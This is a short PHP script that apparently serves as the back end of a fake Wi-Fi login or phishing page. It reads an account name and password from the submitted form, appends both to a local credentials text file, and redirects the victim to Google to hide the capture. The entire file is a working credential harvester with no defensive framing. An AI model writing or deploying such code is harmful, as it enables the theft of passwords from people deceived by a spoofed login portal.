<?php

file_put_contents("credentials/wifi_credentials.txt", "Account: " . $_POST['key2'] . " Pass: " . $_POST['key1'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
exit();
